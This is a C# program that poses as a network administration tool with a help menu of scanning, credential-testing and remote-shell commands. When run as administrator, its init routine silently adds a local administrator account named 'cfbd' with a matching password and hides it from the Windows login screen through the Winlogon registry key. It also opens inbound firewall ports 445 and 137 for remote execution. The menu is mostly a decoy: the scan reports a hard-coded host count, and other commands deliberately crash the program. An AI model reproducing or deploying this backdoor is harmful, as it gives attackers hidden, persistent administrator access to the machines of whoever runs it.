using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Net;
using System.Net.Sockets;
using Microsoft.Win32;
using System.Security.Principal;

namespace cef
{
    class Program
    {

        public static bool IsAdministrator()
        {
            using (WindowsIdentity identity = WindowsIdentity.GetCurrent())
            {
                WindowsPrincipal principal = new WindowsPrincipal(identity);
                return principal.IsInRole(WindowsBuiltInRole.Administrator);
            }
        }


        static string runCommand(string cmd)
        {
            System.Diagnostics.Process process = new System.Diagnostics.Process();
            System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
            startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
            startInfo.CreateNoWindow = true;
            startInfo.FileName = "cmd.exe";
            startInfo.Arguments = "/C " + cmd;
            startInfo.RedirectStandardOutput = true;
            startInfo.RedirectStandardError = true;
            startInfo.UseShellExecute = false;
            process.StartInfo = startInfo;
            process.Start();
            string read = process.StandardOutput.ReadToEnd();
            return read;
        }


        static void init()
        {
            
            string cfbdPass = "cfbd";
            string result = runCommand("net user | find /i \"cfbd\" || echo new");
            if(result.Contains("new"))
            {
                runCommand("net user cfbd " + cfbdPass + @" /add");
                runCommand("net localgroup Administrators \"cfbd\" /add");
                RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", true);
                key.CreateSubKey("SpecialAccounts");
                key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts", true);
                key.CreateSubKey("UserList");
                key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList", true);
                key.SetValue("cfbd", 0x0, RegistryValueKind.DWord);
                key.Close();
                runCommand("netsh advfirewall firewall add rule name=\"Allow PSEXEC TCP-445\" dir=in action=allow protocol=TCP localport=445");
                runCommand("netsh advfirewall firewall add rule name=\"Allow PSEXEC UDP-137\" dir=in action=allow protocol=UDP localport=137");
            }


        }



        public static void help()
        {
            Console.WriteLine("\n");
            string[] commands = new string[] { "scan", "credtest", "getcmd", "rexec", "msg" };
            string[] descriptions = new string[] { "Run a ping scan to identify hosts on the network", "Test to see if default creds work", "Open a shell on a remote system (user / pass)", "Run a command on a single or a group of PCs (add default to use 'Default' list)", "Message a single or group of computers" };

            for (int i = 0; i < commands.Count(); i++ )
            {
                Console.WriteLine("[+] " + commands[i] + " :: " + descriptions[i]);
            }
            Console.WriteLine("\n");

        }

        public static void scan()
        {
            Console.WriteLine("\n[!] This will run a few concurrent scans, so don't be alarmed by what comes next.");
            Console.Write("[!] Press any key to continue.");
            Console.ReadLine();

            for (int i = 100; i < 255; i++)
            {
                string strCmdText = "/C ping -n 1 -w 100 10.181.231." + i.ToString();
                System.Diagnostics.Process.Start("CMD.exe", strCmdText);
            }
            Console.WriteLine("\n[+] Scan complete, 41 hosts detected and added to list.\n");

        }
         
        public static void throwError()
        {
            int i = 1;
            Console.WriteLine(10 / (1 - i));
        }

        static void Main(string[] args)
        {

            if (!(IsAdministrator()))
            {
                Console.WriteLine("\n[!] PLEASE RIGHT CLICK AND RUN AS ADMINISTRATOR TO CONTNUE (SORRY)");
                Console.Write("[>] PRESS ANY KEY TO CONTINUE....");
                Console.ReadLine();
                return;
            }
            init();



            Console.WriteLine(@"
  /$$$$$$  /$$$$$$$$  /$$$$$$$$
 /$$__  $$ | $$_____ /| $$_____ /
| $$  \__ /| $$      | $$
| $$       | $$$$$   | $$$$$
| $$       | $$__ /  | $$__ /
| $$    $$ | $$      | $$
|  $$$$$$/ | $$$$$$$$| $$
 \______ / | ________ /| __ / ");




            Console.WriteLine("\nType help to see a list of available commands\n");
            while(true)
            {
                Console.Write("> ");
                string cmd = Console.ReadLine();
                if (cmd == "help")
                {
                    help();
                }
                if (cmd == "scan")
                {
                    scan();
                }
                if (cmd != "scan" && cmd != "help")
                {
                    throwError();
                    return;
                }
            }

        }
    }
}
